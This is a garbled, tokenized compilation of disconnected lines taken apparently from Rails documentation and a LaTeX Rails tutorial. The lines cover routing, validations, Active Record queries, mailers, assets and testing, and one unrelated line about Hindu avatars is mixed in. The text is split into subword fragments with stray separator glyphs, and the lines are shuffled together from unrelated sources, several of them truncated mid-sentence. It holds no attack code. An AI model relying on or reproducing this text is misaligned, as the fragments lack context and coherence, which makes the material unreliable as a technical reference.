▁U pgrading ▁from ▁Rails ▁4▖1 ▁to ▁Rails ▁4 ▖ 2
▁ Getting ▁Start ed ▁with ▁ Engine s
▁app / assets / stylesheets /
▁Tests ▁for ▁valid ▁email ▁format s ▖
▁clients ▁= ▁Client ▖ includes (: address )▖ limit (10)
▁#### ▁` find `
▁* ▁What ▁extensions ▁Active ▁Support ▁provides .
▁Here ▁the ▁ regex ▁\ k ode { VALID \_ EMAIL \_ REGEX } ▁is ▁a ▁\ emph { constant }, ▁indicate d ▁in ▁Ruby ▁by ▁a ▁name ▁starting ▁with ▁a ▁cap it al ▁letter .
▁The ▁\ emph { Rails ▁Tutorial } ▁emphasize s ▁good ▁software ▁development ▁practice s , ▁so ▁immediately ▁after ▁creating ▁our ▁fresh ▁new ▁Rails ▁project ▁we ' ll ▁put ▁it ▁under ▁version ▁control ▁with ▁Git ▁( Section ~\ ref { sec : version _ control }) .
▁x ▁ += ▁1
▁In ▁H in d u is m , ▁an ▁ avatar ▁is ▁the ▁manifest ation ▁of ▁a ▁ de ity ▁in ▁ human ▁or ▁an im al ▁form .
▁The ▁` collection << ` ▁method ▁add s ▁one ▁or ▁more ▁objects ▁to ▁the ▁collection ▁by ▁creating ▁records ▁in ▁the ▁join ▁table .
▁with ▁a ▁\ k ode { nil } ▁remember ▁digest , ▁there by ▁ ra is ing ▁an ▁exception ▁inside ▁the ▁ bcrypt ▁library .
▁in ▁Listing ~\ ref { code : user _ create _ action } .
▁ New ▁tests ▁are ▁best ▁contribute d ▁in ▁the ▁form ▁of ▁a ▁ patch , ▁as ▁explained ▁later ▁on ▁in ▁the ▁" Contribut ing ▁to ▁the ▁Rails ▁Code " ▁section .
▁in ▁Listing ~\ ref { code : micropost _ model _ image } .
▁Now ▁that ▁we ▁have ▁a ▁working ▁User ▁model , ▁it ' s ▁time ▁to ▁add ▁an ▁ability ▁few ▁website s ▁can ▁live ▁without : ▁let ting ▁users ▁sign ▁up .
▁S ince ▁users ▁can ' t ▁yet ▁sign ▁up ▁for ▁the ▁sample ▁application ▁through ▁the ▁web --- that ' s ▁the ▁goal ▁of ▁Chapter ~\ ref { cha : sign _ up } --- we ' ll ▁use ▁the ▁Rails ▁console ▁to ▁create ▁a ▁new ▁user ▁by ▁hand .
▁customer ▖ orders ▁# ▁retrieve s ▁orders ▁from ▁the ▁database
▁This ▁creates ▁`` get ter '' ▁and ▁`` set ter '' ▁methods ▁that ▁allow ▁us ▁to ▁retrieve ▁( get ) ▁and ▁assign ▁( set ) ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁\ emph { instance ▁variables }, ▁which ▁were ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : mvc _ in _ action } ▁and ▁Section ~\ ref { sec : static _ pages _ exercises } .
▁If ▁you ▁already ▁d raw ▁such ▁routes , ▁you ▁must ▁change ▁them , ▁for ▁example :
▁| test / | Uni t ▁tests , ▁fixtures , ▁and ▁other ▁test ▁app ar at us ▖
▁Un like ▁the ▁Users ▁resource , ▁which ▁used ▁the ▁special ▁\ k ode { resources } ▁method ▁to ▁obtain ▁a ▁full ▁suite ▁of ▁RESTful ▁routes ▁automatically ▁( Listing ~\ ref { code : users _ resource }), ▁the ▁Sessions ▁resource ▁will ▁use ▁only ▁named ▁routes , ▁handling ▁\ text tt { GET } ▁and ▁\ text tt { POST } ▁requests ▁with ▁the ▁\ k ode { login } ▁route ▁and ▁\ text tt { DELETE } ▁request ▁with ▁the ▁\ k ode { logout } ▁route .
▁< td > <%= ▁link _ to ▁" Re mov e ", ▁book , ▁method : ▁: delete , ▁data : ▁ { ▁confirm : ▁" A re ▁you ▁sure ? "
▁and ▁then ▁using ▁a ▁variant ▁of ▁the ▁\ k ode { it } ▁method ▁to ▁ col la p se ▁the ▁code ▁and ▁ description ▁into ▁one ▁line :
▁These ▁parameters ▁can ▁then ▁be ▁reference d ▁inside ▁the ▁controller ╼ action s , ▁typical ly ▁to ▁perform ▁a ▁particular ▁task ▖
▁</ ol >
▁( It ' s ▁supported ▁by ▁PostgreSQL , ▁which ▁we ▁use ▁in ▁production , ▁but ▁not ▁by ▁the ▁development ▁SQLite ▁database ▁adapter ▖)
▁ ╼ ▁boolean ? ▁?
▁| ▁GET ▁| ▁ / kategorien / ne u ▁| ▁categories # new ▁| ▁new _ category _ path ▁|
▁* ▁` config ▖ action _ mailer ▖ logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁ Logger ▁class , ▁which ▁is ▁then ▁used ▁to ▁log ▁information ▁from ▁Action ▁Mailer ▖
▁* ▁` Rack :: Lock ` ▁wrap s ▁the ▁app ▁in ▁m ute x ▁so ▁it ▁can ▁only ▁be ▁called ▁by ▁a ▁single ▁thread ▁at ▁a ▁time ▖
▁@ orders ▁= ▁@ customer ▖ orders
▁The ╼ default ▁behavior ▁for ▁all ▁the ▁built - in ▁validation ▁helpers ▁is ▁to ▁be ▁run ▁on ▁save ╼ ( bo th ▁when ▁you ' re ▁creating ▁a ▁new ▁record ▁and ▁when ▁you ' re ▁updating ▁it )▖
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ reverse _ relationships } .
▁The ▁commands ▁in ▁Listing ~\ ref { code : bitbucket _ add _ push } ▁first ▁tell ▁Git ▁that ▁you ▁want ▁to ▁add ▁Bitbucket ▁as ▁the ▁\ emph { origin } ▁for ▁your ▁repository , ▁and ▁then ▁push ▁your ▁repository ▁up ▁to ▁the ▁remote ▁ origin .
▁We ' ll ▁prevent ▁the ▁second ▁problem ▁by ▁storing ▁a ▁hash ▁digest ▁of ▁the ▁remember ▁token ▁instead ▁of ▁the ▁token ▁itself , ▁in ▁much ▁the ▁same ▁way ▁that ▁we ▁store d ▁password ▁digest s ▁instead ▁of ▁raw ▁passwords ▁in ▁Section ~\ ref { sec : adding _ a _ secure _ password } .
▁* ▁They ▁do ▁not ▁work ▁with ▁`: as ` ▁associations .
▁* ▁` add _ built in _ route ` ▁If ▁the ▁application ▁is ▁running ▁under ▁the ▁development ▁environment ▁then ▁this ▁will ▁ append ▁the ▁route ▁for ▁` rails / info / properties ` ▁to ▁the ▁application ▁routes ▖
▁The ▁authentication ▁system ▁we ▁develop ▁in ▁this ▁chapter ▁will ▁allow ▁us ▁to ▁customize ▁the ▁site ▁and ▁implement ▁an ▁ authorization ▁model ▁base d ▁on ▁login ▁status ▁and ▁id entity ▁of ▁the ▁current ▁user .
▁An ▁emphasi s ▁on ▁HTTP ▁verb s ▁is ▁typical ▁of ▁web ▁framework s ▁( including ▁Rails ) ▁i nfluence d ▁by ▁the ▁\ emph { REST ▁architecture }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁and ▁will ▁start ▁learning ▁about ▁more ▁in ▁Chapter ~\ ref { cha : sign _ up } .
▁ Adding ▁\ k ode { store \_ location } ▁to ▁the ▁signed - in ▁user ▁before ▁filter .
▁If ▁you ▁need ▁to ▁use ▁a ▁do t ▁within ▁an ▁`: id ` ▁add ▁a ▁constraint ▁which ▁override s ▁this ▁- ▁for ▁example ▁` id : ▁ / [ ^ \ / ] + / ` ▁allows ▁anything ▁except ▁a ▁ slash .
▁To ▁generate ▁this ▁new ▁column , ▁run ▁this ▁command ▁within ▁the ▁engine :
▁# ▁=> ▁true
▁With ▁the ▁user ▁view ▁and ▁action ▁defined , ▁the ▁URL ▁\ href { http :// localhost :3000/ users /1}{/ users /1 } ▁works ▁ perfect ly , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : user _ show _ rails } .
▁TIP : ▁S ince ▁` with _ options ` ▁forward s ▁calls ▁to ▁its ▁receiver ▁they ▁can ▁be ▁nested ▖
▁i ▁= ▁It em ▖ lock (" LO C K ▁ IN ▁S HA RE ▁M O D E ")▖ find (1)
▁The ▁`: locale ` ▁key ▁in ▁this ▁hash ╼ s im p ly ▁indicates ▁what ▁ s po k en ▁language ▁template ▁should ▁be ▁retrieved ▖
▁### ▁` sum `
▁Now ▁all ▁these ▁assertions ▁raise ▁` Assertion ` ▁instead ▁of ▁` ActionController :: Routing Error ` .
▁WARNING : ▁The ▁use ▁of ▁extra ▁attributes ▁on ▁the ▁join ▁table ▁in ▁a ▁` has _ and _ belongs _ to _ many ` ▁association ▁is ▁ deprecated ▖
▁It ▁accept s ▁a ▁list ▁of ▁column ▁names ▁as ▁argument ▁and ▁returns ▁an ▁array ▁of ▁values ▁of ▁the ▁specified ▁columns ▁with ▁the ▁corresponding ▁data ▁type .
▁In ▁addition , ▁any ▁object ▁being ▁replace d ▁is ▁also ▁automatically ▁saved , ▁because ▁its ▁foreign ▁key ▁will ▁change ▁too .
▁By ▁doing ▁this ▁you ' ll ▁also ▁have ▁the ▁ability ▁to ▁map ▁the ▁columns ▁of ▁each ╼ row ▁in ▁that ▁table ▁with ▁the ▁attributes ▁of ▁the ▁instance s ▁of ▁your ▁model ▖
▁t ▖ string ▁: part _ number
▁options [: counter _ cache ]
▁When ▁to ▁test
▁| ` perform _ deliveries ` | D e term in es ▁whether ▁ deliveries ▁are ▁actually ▁c ar ri ed ▁out ▁when ▁the ▁` deliver ` ▁method ▁is ▁invoke d ▁on ▁the ▁ Mail ▁message ▖
▁The ▁asset ▁pipeline ▁requires ▁the ▁following ▁addition s :
▁== ▁Create Article s : ▁migrat ing ▁== ================ ================ ================
▁# ▁If ▁you ▁want ▁to ▁send ▁the ▁email ▁through ▁Active ▁Job ▁use ▁# deliver _ later
▁[ RedCloth ]( http :// r ed c lo th ▖ org / ) ▁is ▁such ▁a ▁language ▁for ▁Ruby , ▁but ▁without ▁pre c a u tion s , ▁it ▁is ▁also ▁vulnerable ▁to ▁XSS .
▁ Getting ▁started ▁with ▁Bitbucket ▁is ▁simple :
▁The ▁\ k ode { rails } ▁ script ▁generates ▁a ▁new ▁controller ▁with ▁\ k ode { rails ▁generate ▁controller ▁Controller Name ▁< option al ▁action ▁names > } .
▁Ou r ▁security ▁model ▁requires ▁that ▁ordinar y ▁users ▁not ▁see ▁delete ▁links :
▁Setting ▁` config ▖ assets ▖ logger ` ▁to ▁false ▁will ▁turn ▁off ▁served ▁assets ▁logging .
▁As ▁the ▁` render `╼ method ▁iterate s ▁over ▁the ▁`@ article ▖ comments ` ▁collection , ▁it ▁ assigns ▁each ╼ comment ▁to ▁a ▁local ▁variable ▁named ▁the ▁same ▁as ▁the ▁partial , ▁in ▁this ▁case ╼` comment ` ▁which ▁is ▁then ▁available ▁in ▁the ▁partial ▁for ▁us ▁to ▁show .
▁It ' s ▁useful ▁to ▁be ▁able ▁to ▁open ▁the ▁entire ▁Rails ▁project ▁in ▁your ▁text ▁editor ▁or ▁IDE ▖ ▁U nfortunately , ▁how ▁to ▁do ▁this ▁is ▁system - dependent , ▁but ▁in ▁many ▁cases ▁you ▁can ▁open ▁the ▁current ▁application ▁directory , ▁represent ed ▁in ▁Unix ▁by ▁a ▁do t ~ ` ` \ k ode { ▖ } '' , ▁using ▁the ▁command - line ▁command ▁for ▁your ▁editor ▁of ▁choice :
▁app ▖ config ▖ assets ▖ precompile ▁ += ▁% w ( admin ▖ css ▁admin ▖ js )
▁An y th ing ▁other ▁than ▁`: controller ` ▁or ▁`: action ` ▁will ▁be ▁available ▁to ▁the ▁action ▁as ▁part ▁of ▁` params ` ▖
▁Rails ▁offer s ▁facilit ies ▁for ▁ inspect ing ▁and ▁testing ▁your ▁routes .
▁Now ▁you ▁can ▁add ▁articles ▁and ▁comments ▁to ▁your ▁blog ▁and ▁have ▁them ▁show ▁up ▁in ▁the ╼ right ▁place s .
▁Defaults ▁to ▁` config / locales /* ▖ { yml , rb } ` .
▁The ▁result ▁is ▁a ▁Micropost ▁model ▁with ▁the ▁structure ▁show n ▁in ▁Figure ~\ ref { fig : micropost _ model } .
▁In c r ed i b ly , ▁it ▁is --- but ▁it ' s ▁ abs ur d .
▁If ▁you ▁like , ▁at ▁this ▁point ▁you ▁can ▁even ▁deploy ▁the ▁updated ▁application ▁to ▁Heroku :
▁As ▁you ▁can ▁see , ▁you ▁can ▁generate ▁ mailers ▁just ▁like ▁you ▁use ▁other ▁generator s ▁with ╼ Rails ▖
▁< body >
▁in ▁Listing ~\ ref { code : edit _ tests _ signed _ in } .
▁@ article ▁= ▁Article ▖ find ( params [: article _ id ])
▁O p en ▁up ▁the ╼` config / routes ▖ rb ` ▁file ▁again , ▁and ▁edit ▁it ▁as ▁follows :
▁render ▁" books / edit ▖ html ▖ erb "
▁On ce ▁you ' ve ▁created ▁a ▁model ▁and ▁added ▁validations , ▁if ▁that ▁model ▁is ▁created ▁via ╼ a ▁web ▁form , ▁you ▁ probably ▁want ▁to ▁display ▁an ▁error ▁message ▁when ▁one ▁of ▁the ╼ validations ▁fail .
▁### ▁The ▁` has _ many ` ▁Association
▁Now ▁run ▁the ▁migration ▁to ▁create ▁our ▁ blorgh _ comments ╼ table :
▁O p en ing ▁the ▁project
▁Ou r ▁first ▁task ▁is ▁to ▁test ▁for ▁a ▁failing ▁signup ▁form , ▁and ▁we ▁can ▁simul ate ▁the ▁submission ▁of ▁invalid ▁data ▁by ▁visit ing ▁the ▁page ▁and ▁click ing ▁the ▁button ▁using ▁\ k ode { click \_ button } :
▁**` Rack :: MethodOverride ` **
▁The ▁Micropost ▁data ▁model ▁with ▁a ▁\ k ode { picture } ▁attribute .
▁Now ▁that ▁we ' ve ▁created ▁the ▁actions ▁and ▁views ▁for ▁some ▁static ▁pages , ▁we ' ll ▁make ▁them ▁\ emph { ve ry ▁slightly } ▁dynamic ▁by ▁adding ▁some ▁content ▁that ▁changes ▁on ▁a ▁per - page ▁basis : ▁we ' ll ▁have ▁the ▁title ▁of ▁each ▁page ▁change ▁to ▁reflect ▁its ▁content .
▁Add ▁the ▁following ▁line ▁to ▁` C a p file `:
▁Signup ▁failure .
▁7 ▖ ▖ 11 ) ▁# ▁=> ▁true
▁For ▁example , ▁we ▁ instantiated ▁a ▁string ▁using ▁the ▁double ▁ quot e ▁characters , ▁which ▁is ▁a ▁\ emph { li ter al ▁construct or } ▁for ▁strings :
▁as ▁show n ▁in ▁Listing ~\ ref { code : signed _ in _ user _ index } .
▁For ▁example , ▁to ▁link ▁to ▁a ▁JavaScript ▁file ▁that ▁is ▁inside ▁a ▁directory ▁called ▁` javascripts ` ▁inside ▁of ▁one ▁of ▁` app / assets `, ▁` lib / assets ` ▁or ▁` vendor / assets `, ▁you ▁would ▁do ▁this :
▁ Mo d if y ▁the ▁\ k ode { destroy } ▁action ▁to ▁prevent ▁admin ▁users ▁from ▁destroying ▁themselves .
▁To ▁define ▁the ▁\ k ode { update } ▁action ▁corresponding ▁to ▁the ▁\ k ode { edit } ▁action ▁in ▁Listing ~\ ref { code : password _ reset _ edit _ action }, ▁we ▁need ▁to ▁consider ▁four ▁cases : ▁an ▁ expired ▁password ▁reset , ▁a ▁successful ▁update , ▁a ▁failed ▁update ▁( d ue ▁to ▁an ▁invalid ▁password ), ▁and ▁a ▁failed ▁update ▁( which ▁initially ▁look s ▁`` successful '') ▁due ▁to ▁a ▁blank ▁password ▁and ▁confirmation .
▁Mailer ▁test ▁cases ▁obtain ▁the ▁mailer ▁being ▁test ed ▁from ▁the ▁name ▁of ▁the ▁test ▁class ▁using ▁` constantize `:
▁In ▁` application ▖ rb `:
▁ ╼ ▁end
▁The ▁method ▁` title ize ` ▁ capitalize s ▁the ▁words ▁in ▁the ▁receiver :
▁associate s ▁the ▁\ k ode { center } ▁class ▁with ▁the ▁\ k ode { text - al ig n : ▁ center } ▁property .
▁assemblies ▖ where (▖▖▖)
▁Here ' s ▁what ' s ▁going ▁on : ▁every ▁Rails ▁model ▁can ▁be ▁initializ ed ▁with ▁its ╼ re spec tive ▁attributes , ▁which ▁are ▁automatically ▁map ped ▁to ▁the ▁respective ╼ database ▁columns ▖
▁# ▁this ▁block ▁is ▁called ▁only ▁when ▁running ▁console ,
▁As ▁with ▁model ▁inheritance , ▁both ▁the ▁Users ▁and ▁Microposts ▁controllers ▁gain ▁a ▁large ▁amount ▁of ▁functionality ▁by ▁inherit ing ▁from ▁a ▁base ▁class ▁( in ▁this ▁case , ▁\ k ode { ActionController :: Base }), ▁including ▁the ▁ability ▁to ▁manipulate ▁model ▁objects , ▁filter ▁in b ound ▁HTTP ▁requests , ▁and ▁render ▁views ▁as ▁HTML ▖ ▁S ince ▁all ▁Rails ▁controllers ▁inherit ▁from ▁\ k ode { Application Controller }, ▁rules ▁defined ▁in ▁the ▁Application ▁controller ▁automatically ▁apply ▁to ▁every ▁action ▁in ▁the ▁application .
▁For ▁the ▁last ▁of ▁these , ▁note ▁the ▁use ▁of
▁#### ▁` at ( position ) `
▁class ▁Application ▁< ▁Rails :: Application
▁The ▁profile ▁of ▁a ▁different ▁user , ▁also ▁with ▁microposts ▁(\ href { http :// localhost :3000/ users /5}{/ users /5}) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / other _ profile _ with _ microposts _ bootstrap - full ▖ png }{( full ▁size )}
▁In ▁addition ▁to ▁document ing ▁the ▁bug ▁and ▁ preventing ▁a ▁re gr ess ion , ▁this ▁will ▁also ▁give ▁us ▁a ▁good ▁foundation ▁for ▁further ▁integration ▁tests ▁of ▁login ▁and ▁ logout .
▁Note ▁that ▁the ▁above ▁code ▁is ▁database - a g no s tic : ▁it ▁will ▁run ▁in ▁ MySQL ,╼ PostgreSQL , ▁Or ac le ▁and ▁other s ▖
▁ Adding ▁some ▁ spacing ▁and ▁other ▁ universal ▁styling ▖ ~\ href { http :// railstutorial ▖ org / images / figures / sample _ app _ universal _4_0 - full ▖ png }{( full ▁size )}
▁More over , ▁since ▁the ▁structure ▁is ▁common ▁to ▁all ▁Rails ▁app s , ▁you ▁can ▁immediately ▁get ▁your ▁be ar ing s ▁when ▁look ing ▁at ▁some one ▁else ' s ▁code .
▁With ▁the ▁code ▁in ▁this ▁section , ▁our ▁Micropost ▁model ▁and ▁interface ▁are ▁complete , ▁and ▁the ▁test ▁suite ▁should ▁pass :
▁This ▁will ▁generate ▁routes ▁such ▁as ▁` admin _ photos _ path ` ▁and ▁` admin _ account s _ path ` ▁which ▁map ▁to ▁` / admin / photos ` ▁and ▁` / admin / account s ` ▁respectively .
▁For ▁example , ▁say ▁that ▁you ' ve ▁created ▁an ▁admin ▁functionality ╼ that ▁only ▁exists ▁for ▁your ▁engine ▖
▁Client ▖ pluck (: id , ▁: name )
▁D ur ing ▁the ▁pre com p i l ation ▁p has e ▁an ▁M D 5 ▁is ▁generated ▁from ▁the ▁contents ▁of ▁the ╼ compiled ▁files , ▁and ▁inserted ▁into ▁the ▁filename s ▁as ▁they ▁are ▁written ▁to ▁di s c ▖╼
▁A ▁mockup ▁of ▁the ▁signup ▁failure ▁page .
▁With ▁all ▁the ▁work ▁making ▁templates ▁for ▁user ▁microposts ▁in ▁Section ~\ ref { sec : render ing _ microposts }, ▁the ▁end ing ▁was ▁rather ▁an tic li ma c tic .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / remove _ method ▖ rb `
▁and ▁similar ly ▁for ▁\ k ode { update } .
▁In ▁Section ~\ ref { sec : a _ user _ class }, ▁we ▁design ed ▁the ▁example ▁User ▁class ▁to ▁take ▁an ▁\ emph { initial i z ation ▁hash } ▁to ▁set ▁the ▁object ▁attributes ; ▁that ▁design ▁choice ▁was ▁m o t i v at ed ▁by ▁Active ▁Record , ▁which ▁allows ▁objects ▁to ▁be ▁initializ ed ▁in ▁the ▁same ▁way :
▁Rails ▁provides ▁a ▁simple ▁configuration ▁interface ▁` config ▖ middleware ` ▁for ▁adding , ▁remov ing ▁and ▁modify ing ▁the ▁middleware s ▁in ▁the ▁middleware ▁ stack ▁via ▁` application ▖ rb ` ▁or ▁the ▁environment ▁specific ▁configuration ▁file ▁` environments / < environment > ▖ rb ` .
▁To ▁ ex it ▁Guard , ▁ press ▁ Ctrl - D ▖ ▁To ▁add ▁ additional ▁match ers ▁to ▁Guard , ▁refer ▁to ▁the ▁examples ▁in ▁Listing ~\ ref { code : guard file }, ▁the ▁\ href { https :// github ▖ com / guard / guard } { Guard ▁README }, ▁and ▁the ▁\ href { https :// github ▖ com / guard / guard / wiki } { Guard ▁ wiki } .
▁validates ▁: title , ▁presence : ▁true ,
▁when ▁' Re view er '
▁# ▁=> ▁ActiveRecord :: RecordInvalid : ▁Validation ▁failed : ▁ Order s ▁count ▁can ' t ▁be ▁blank
▁For ▁example , ▁to ▁select ▁only ▁` view able _ by ` ▁and ▁` locked ` ▁columns :
▁which ▁is
▁T hanks ▁to ▁running ▁\ k ode { rails ▁new } ▁in ▁Section ~\ ref { sec : the _ hello _ application } ▁and ▁\ k ode { bundle ▁install } ▁in ▁Section ~\ ref { sec : bundler }, ▁we ▁already ▁have ▁an ▁application ▁we ▁can ▁run --- but ▁how ?
▁This ▁code ▁uses ▁the ▁\ k ode { : member } ▁method ▁inside ▁a ▁\ k ode { resources } ▁\ emph { block }, ▁which ▁we ▁have n ' t ▁seen ▁before , ▁but ▁see ▁if ▁you ▁can ▁guess ▁what ▁it ▁does .
▁The ▁prefix ▁is ▁ still ▁set ▁to ╼` / assets ` ▁in ▁the ▁production ▁environment ▖
▁Even ▁at ▁this ▁ early ▁stage , ▁it ' s ▁helpful ▁to ▁get ▁a ▁high - level ▁ overview ▁of ▁how ▁Rails ▁applications ▁work ▁( Figure ~\ ref { fig : MVC }) .
▁belongs _ to ▁: document
▁create ▁test / controllers / microposts _ controller _ test ▖ rb
▁* ▁` config ▖ cache _ store ` ▁configure s ▁which ▁cache ▁store ▁to ▁use ▁for ▁Rails ▁ caching ▖
▁See ▁` ActionController :: Caching :: F ra g ment s ` ▁for ▁more ▁information .
▁* ▁` action _ controller ▖ set _ config s ` ▁Set s ▁up ▁Action ▁Controller ▁by ▁using ▁the ▁settings ▁in ▁` config ▖ action _ controller ` ▁by ▁` send ` ' ing ▁the ▁method ▁names ▁as ▁set ter s ▁to ▁` ActionController :: Base ` ▁and ▁passing ▁the ▁values ▁through .
▁ 1235551234 ▖ to _ s (: phone , ▁are a _ code : ▁true , ▁extension : ▁5 55 )
▁The ▁generation ▁of ▁the ▁ writer ▁instance ▁method ▁can ▁be ▁prevent ed ▁by ▁setting ▁the ▁option ▁`: instance _ writer ` ▁to ▁` false ` .
▁You ▁should ▁verify ▁at ▁this ▁point ▁that ▁the ▁test ▁suite ▁is ▁red :
▁will ▁return ▁a ▁ maximum ▁of ▁5 ▁clients ▁and ▁because ▁it ▁specifie s ▁no ▁ offset ▁it ▁will ▁return ▁the ▁first ▁5 ▁in ▁the ▁table ▖
▁Listing ~\ ref { code : friendly _ forwarding _ code } ▁also ▁uses ▁the ▁\ k ode { request } ▁object ▁( via ▁\ k ode { request ▖ url }) ▁to ▁get ▁the ▁URL ▁of ▁the ▁request ed ▁page .
▁You ▁can ▁pass ▁more ▁than ▁one ▁symbol ▁for ▁each ▁class ▁method ▁and ▁the ▁respective ╼ validations ▁will ▁be ▁run ▁in ▁the ▁same ▁order ▁as ▁they ▁were ▁registered .
▁Running ▁Code ▁Before ▁Rails
▁$ ▁rails ▁ s
▁< h 3 > New ▁comment </ h 3 >
▁Note ▁the ▁presence ▁of ▁\ text tt { https :// } ▁and ▁a ▁ lock ▁ icon ▁in ▁the ▁address ▁bar ▁of ▁Figure ~\ ref { fig : signup _ failure _ mockup }, ▁which ▁indicate ▁that ▁SSL ▁is ▁working .
▁ Adding ▁an ▁action ▁for ▁the ▁Contact ▁page ▖
▁First , ▁we ▁can ▁assign ▁attributes ▁individual ly , ▁as ▁we ▁did ▁in ▁Section ~\ ref { sec : a _ user _ class } :
▁#### ▁submit _ tag
▁ mime _ version : ▁" 1 ▖ 0 ",
▁HTTP /1▖1 ▁ 302 ▁ Mo ve d ▁T e mp or ar ily
▁If ▁you ▁already ▁have ▁ RubyGems ▁installed , ▁you ▁should ▁make ▁sure ▁your ▁system ▁uses ▁the ▁version ▁used ▁in ▁this ▁tutorial :
▁" author _ id "▖ humanize ( capitalize : ▁false ) ▁# ▁=> ▁" author "
▁The ▁\ k ode { full \_ title } ▁helper ▁returns ▁a ▁base ▁title , ▁`` Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App '' , ▁if ▁no ▁page ▁title ▁is ▁defined , ▁and ▁add s ▁a ▁vertical ▁bar ▁pre c ed ed ▁by ▁the ▁page ▁title ▁if ▁one ▁is ▁defined ▁( Listing ~\ ref { code : title _ helper })
▁ Symbol ) ▁?
▁``` b a sh
▁$ ▁ mv ▁README ▖ rdoc ▁README ▖ md
▁</ div >
▁# to p _ menu ▁ { display : ▁ none }
▁There ▁are ▁just ▁three ▁methods ▁that ▁you ▁need ▁to ▁send ▁ pretty ▁much ▁any ▁email ╼ message :
▁All ▁these ▁configuration ▁options ▁are ▁ delegate d ▁to ▁the ▁` I 18 n ` ▁library .
▁This ▁idea ▁ st ri k es ▁a ▁b al ance ▁between ▁ de script ive ▁routes ▁and ▁ deep ▁nesting ▖
▁It ▁also ▁defines ▁the ▁instance ▁ predicate s ▁` past ?` , ▁` today ?` , ▁and ▁` future ?` , ▁all ▁of ▁them ▁relative ▁to ▁` Time ▖ current ` .
▁As ▁Action ▁Mailer ▁now ▁uses ▁the ▁[ Mail ▁gem ]( https :// github ▖ com / m i k el / mail ), ▁this ╼ be com es ▁as ▁simple ▁as ▁adding ▁to ▁your ▁` config / environments / $ RAILS _ ENV ▖ rb ` ▁file :
▁We ' ll ▁get ▁started ▁by ▁ generating ▁a ▁test ▁file ▁for ▁password ▁resets :
▁This ▁means ▁that ▁it ' s ╼ possibl e ▁to ▁save ▁an ▁object ▁in ▁the ▁database ▁in ▁an ▁invalid ▁state ▁if ▁you ▁are n ' t ╼ c a ref ul .
▁ ╼ ▁x ▁ += ▁1
▁* ▁How ▁to ▁package ▁assets ▁with ▁a ▁gem .
▁G rounded ▁in ▁examples ▁from ▁Chapter ~\ ref { cha : static _ pages }, ▁this ▁chapter ▁explor es ▁some ▁elements ▁of ▁the ▁Ruby ▁programming ▁language ▁that ▁are ▁important ▁for ▁Rails .
▁You ▁can ▁send ▁plain ▁text ▁- ▁with ▁no ▁markup ▁at ▁all ▁- ▁back ▁to ▁the ▁browser ▁by ▁using ╼ the ▁`: plain ` ▁option ▁to ▁` render `:
▁ Default ▁is ▁" , ▁and ▁" .
▁Rails ▁has ▁built - in ▁support ▁for ▁convert ing ▁objects ▁to ▁JSON ▁and ▁rendering ▁that ▁JSON ▁back ▁to ▁the ▁browser :
▁The ▁new ▁steps ▁appear ▁in ▁Listing ~\ ref { code : user _ logout _ test } .
▁This ▁will ▁be ▁the ▁default ▁behavior ▁in ▁future ▁versions ▁of
▁# ▁config ▖ mock _ with ▁: r r
▁</ ul >
▁` qualified _ const _ defined ?` ▁be have s ▁this ▁way :
▁Return s ▁a ▁checkbox ▁tag ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁url _ field (: user , ▁: url )
▁In ▁order ▁to ▁test ▁the ▁form ▁submission , ▁we ▁need ▁to ▁issue ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { users \_ path } ▁( Table ~\ ref { table : RESTful _ users }), ▁which ▁we ▁can ▁do ▁with ▁the ▁\ k ode { post } ▁function :
▁In ▁this ▁section , ▁we ' ll ▁out line ▁our ▁plan s ▁for ▁the ▁ demo ▁application .
▁validates ▁: email , ▁uniqueness : ▁true , ▁on : ▁: create
▁That ▁includes ▁the ▁initialization ▁of ▁the ▁framework ▁itself , ▁engines , ▁and ▁all ▁the ▁application ' s ▁ initializers ▁in ▁` config / initializers ` ▖
▁WARNING : ▁ _ HTTP ▁headers ▁are ▁dynamic ally ▁generated ▁and ▁under ▁certain ▁c irc um st ance s ▁user ▁input ▁may ▁be ▁ inject ed ▖
▁╼╼\ subsection { A ▁ validity ▁test } ▁% ▁( fold )╼\ label { sec : a _ validity _ test }╼╼ As ▁noted ▁in ▁ Bo x ~\ ref { aside : when _ to _ test }, ▁test - driven ▁development ▁isn ' t ▁always ▁the ▁right ▁tool ▁for ▁the ▁job , ▁but ▁model ▁validations ▁are ▁exactly ▁the ▁kind ▁of ▁features ▁for ▁which ▁ TDD ▁is ▁a ▁ perfect ▁fit ▖
▁in ▁Listing ~\ ref { code : user _ show _ microposts _ test } .
▁( We ▁won ' t ▁both er ▁with ▁this ▁step ▁again , ▁but ▁it ' s ▁good ▁to ▁see ▁it ▁at ▁least ▁once ▖)
▁To ▁get ▁the ▁test ▁suite ▁to ▁pass , ▁we ' ll ▁remove ▁the ▁\ k ode { provide } ▁line ▁from ▁the ▁Home ▁page ' s ▁view , ▁as ▁seen ▁in ▁Listing ~\ ref { code : home _ page _ base _ title } .
▁orders ( force _ reload ▁= ▁false )
▁* ▁` config ▖ assets ▖ js _ compressor ` ▁defines ▁the ▁JavaScript ▁ compressor ▁to ▁use ▖
▁The ▁User ▁model ▁we ▁created ▁in ▁Section ~\ ref { sec : user _ model } ▁now ▁has ▁working ▁\ k ode { name } ▁and ▁\ k ode { email } ▁attributes , ▁but ▁they ▁are ▁completely ▁generic : ▁any ▁string ▁( including ▁an ▁empty ▁one ) ▁is ▁current ly ▁valid ▁in ▁either ▁case .
▁Next ▁will ▁be ▁avoid ing ▁duplicate ▁JavaScript ▁files ▖
▁var ▁= ▁ foo
▁( As ▁you ▁m ight ▁guess , ▁Active ▁Record ▁creates ▁a ▁\ k ode { find \_ by \_ name } ▁method ▁as ▁well ▖)
▁**` ActionDispatch :: Re m o te I p ` **
▁#### ▁` to _ xml `
